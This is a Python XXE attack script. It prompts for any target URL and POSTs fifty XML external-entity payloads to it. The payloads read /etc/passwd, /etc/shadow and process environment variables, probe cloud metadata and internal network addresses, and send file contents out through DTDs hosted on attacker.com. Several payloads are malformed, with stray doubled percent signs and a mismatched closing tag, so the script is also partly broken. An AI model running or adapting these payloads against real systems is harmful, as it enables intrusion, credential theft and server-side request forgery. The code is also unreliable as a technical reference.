import requests

# Define multiple XML payloads with different external entities
XXE1 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
XXE2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>'
XXE3 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe.txt">]><foo>&xxe;</foo>'
XXE4 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "file:///etc/passwd"><!ENTITY ret SYSTEM "php://filter/convert.base64-encode/resource=index.php"><!ENTITY data "<!ENTITY exfil SYSTEM \'http://attacker.com/?%xxe;%ret;\'>"> %data; %exfil; %data;]>'
XXE5 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY %% remote SYSTEM "http://attacker.com/evil.dtd">%%remote;%%int;%%send;]>'
XXE6 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY %% d SYSTEM "http://attacker.com/evil.dtd">%%d;]>'
XXE7 = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY %% remote SYSTEM "http://attacker.com/evil.dtd">%%remote;%%int;%%send;]>'
XXE8 = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY %% data SYSTEM "http://attacker.com/evil.dtd">%%data;%%send;]>'
XXE9 = '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'
XXE10 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY %% data SYSTEM "http://attacker.com/evil.dtd">%%data;%%send;]>'
XXE11 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY %% data SYSTEM "http://attacker.com/evil.dtd">%%data;%%send;]>'
XXE12 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'
XXE13 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><test>&xxe;</test>'
XXE14 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/issue"> ]><test>&xxe;</test>'
XXE15 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]><test>&xxe;</test>'
XXE16 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><test>&xxe;</test>'
XXE17 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/resolv.conf"> ]><test>&xxe;</test>'
XXE18 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><test>&xxe;</test>'
XXE19 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]><test>&xxe;</test>'
XXE20 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><test>&xxe;</test>'
XXE21 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost/"> ]><test>&xxe;</test>'
XXE22 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><test>&xxe;</test>'
XXE23 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/"> ]><test>&xxe;</test>'
XXE24 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://127.0.0.1/"> ]><test>&xxe;</test>'
XXE25 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:80/"> ]><test>&xxe;</test>'
XXE26 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:443/"> ]><test>&xxe;</test>'
XXE27 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:8080/"> ]><test>&xxe;</test>'
XXE28 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:8000/"> ]><test>&xxe;</test>'
XXE29 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:5000/"> ]><test>&xxe;</test>'
XXE30 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.1/"> ]><test>&xxe;</test>'
XXE31 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.2/"> ]><test>&xxe;</test>'
XXE32 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.3/"> ]><test>&xxe;</test>'
XXE33 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://10.0.0.1/"> ]><test>&xxe;</test>'
XXE34 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://10.0.0.2/"> ]><test>&xxe;</test>'
XXE35 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://10.0.0.3/"> ]><test>&xxe;</test>'
XXE36 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://172.16.0.1/"> ]><test>&xxe;</test>'
XXE37 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://172.16.0.2/"> ]><test>&xxe;</test>'
XXE38 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://172.16.0.3/"> ]><test>&xxe;</test>'
XXE39 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://example.com/"> ]><test>&xxe;</test>'
XXE40 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://test.com/"> ]><test>&xxe;</test>'
XXE41 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://malicious.com/"> ]><test>&xxe;</test>'
XXE42 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://unsafe.com/"> ]><test>&xxe;</foo>'
XXE43 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://hackme.com/"> ]><test>&xxe;</test>'
XXE44 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://exploit.com/"> ]><test>&xxe;</test>'
XXE45 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attack.com/"> ]><test>&xxe;</test>'
XXE46 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://vulnerable.com/"> ]><test>&xxe;</test>'
XXE47 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://exploitme.com/"> ]><test>&xxe;</test>'
XXE48 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://dangerous.com/"> ]><test>&xxe;</test>'
XXE49 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://harmful.com/"> ]><test>&xxe;</test>'
XXE50 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://malicious.com/"> ]><test>&xxe;</test>'

# Function to test for XXE vulnerability with various payloads
def test_xxe_vulnerability(url):
    try:
        print("Sending test payloads to detect XXE vulnerability...")

        # Define payloads
        payloads = [
            XXE1, XXE2, XXE3, XXE4, XXE5,
            XXE6, XXE7, XXE8, XXE9, XXE10,
            XXE11, XXE12, XXE13, XXE14, XXE15,
            XXE16, XXE17, XXE18, XXE19, XXE20,
            XXE21, XXE22, XXE23, XXE24, XXE25,
            XXE26, XXE27, XXE28, XXE29, XXE30,
            XXE31, XXE32, XXE33, XXE34, XXE35,
            XXE36, XXE37, XXE38, XXE39, XXE40,
            XXE41, XXE42, XXE43, XXE44, XXE45,
            XXE46, XXE47, XXE48, XXE49, XXE50
        ]

        # Vulnerability metrics
        vulnerability_metrics = {}

        # Iterate over each payload and send a POST request
        for index, payload in enumerate(payloads, start=1):
            print(f"Sending Payload {index}...")
            response = requests.post(url, data=payload)
            print(f"Request sent to: {response.url}")

            # Check if the response contains sensitive information
            if 'root:' in response.text:
                print(f"High risk: XXE vulnerability detected for Payload {index}!")
                print(f"Sensitive information retrieved:\n{response.text}")
                vulnerability_metrics[f"XXE{index}"] = "high"
            else:
                print(f"Low risk: Payload {index} did not reveal any sensitive information.")
                vulnerability_metrics[f"XXE{index}"] = "low"

        # Find the first successful injection
        for payload, metric in vulnerability_metrics.items():
            if metric == "high":
                print(f"\nSuccessfully injected payload: {payload}, Vulnerability Metric: {metric}")
                break
        else:
            print("\nNo successful injection found.")

        # Further testing options
        print("To explore further, modify the XML payload to access additional files or external entities.")

    except Exception as e:
        print(f"An error occurred during XXE vulnerability testing: {e}")

# Main function
def main():
    print("XXE Vulnerability Tester")
    target_url = input("Enter the target website URL:")
    if target_url:
        test_xxe_vulnerability(target_url)
    else:
        print("Please enter a target URL.")

if __name__ == "__main__":
    main()

